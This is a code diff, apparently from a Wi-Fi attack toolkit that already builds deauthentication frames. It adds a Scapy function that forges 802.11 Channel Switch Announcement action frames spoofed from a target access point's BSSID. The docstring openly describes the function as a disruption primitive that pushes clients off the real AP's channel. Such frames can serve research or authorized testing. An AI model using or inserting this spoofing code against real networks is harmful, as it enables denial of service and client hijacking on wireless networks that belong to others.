@@ -109,6 +109,29 @@ def craft_deauth(bssid: str, client: str = BROADCAST, reason: int = 7, low_rate:
     return radiotap / dot11 / Dot11Deauth(reason=reason)
 
 
+def craft_csa_action(bssid: str, client: str, new_channel: int, count: int = 1) -> Packet:
+    """Craft a Channel Switch Announcement (CSA) Action frame from bssid,
+    telling client (or BROADCAST) to switch to new_channel.
+
+    Category 0 (Spectrum Management), Action 4 (Channel Switch Announcement)
+    per 802.11-2020 9.6.1 -- an internal implementation note for this project
+    once called for category 6 (Fast BSS Transition), which is wrong: that
+    category's own action codes have nothing to do with channel switching,
+    corrected here rather than propagated.
+
+    Body after the fixed Category/Action octets is the Channel Switch
+    Announcement element (Element ID 37, 3 bytes): Switch Mode (1 -- STAs
+    should stop transmitting until the switch happens), New Channel Number,
+    and Switch Count (TBTTs until the switch; 0 or 1 means "now"/"next
+    beacon", which is what makes this useful as a disruption primitive --
+    a client that honors it jumps off the real AP's actual channel).
+    """
+    dot11 = Dot11(type=0, subtype=13, addr1=client, addr2=bssid, addr3=bssid)
+    action_body = bytes([0, 4])  # category=Spectrum Management, action=Channel Switch Announcement
+    csa_ie = Dot11Elt(ID=37, info=bytes([1, new_channel & 0xFF, count & 0xFF]))
+    return _inject_radiotap() / dot11 / Raw(load=action_body) / csa_ie
+
+
 def with_forced_rate(pkt: Packet, mbps: float) -> Packet:
     """Re-wrap pkt (Dot11 onward) in a fresh RadioTap forcing the TX rate.
 
